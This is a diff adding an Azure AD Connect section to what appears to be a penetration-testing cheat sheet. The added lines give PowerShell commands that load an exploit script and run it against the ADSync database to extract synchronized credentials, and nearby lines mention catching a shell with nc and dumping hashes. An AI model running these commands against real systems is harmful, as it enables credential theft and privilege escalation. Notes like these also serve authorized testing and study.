@@ -1755,6 +1755,22 @@ user to that user .
 and we just catch the shell using nc . 
 ```
 
+### Azure Admins Group (Azure AD Connect) : 
+
+```bash
+# https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
+# https://blog.xpnsec.com/azuread-connect-for-redteam/
+
+# This is the location of the assembly responsible for synchronizing password hashes between the on-prem AD DC and Azure AD (via Password Hash Sync), if you find it think of this attack :
+C:\Program Files\Microsoft Azure AD Sync\Bin
+  
+# Once you transfer the PS exploit :
+. .\exp.ps1
+Azure-ADConnect -server 10.10.10.10 -db ADSync
+
+```
+
+
 ## Dumping Hashes :
 
 ```bash
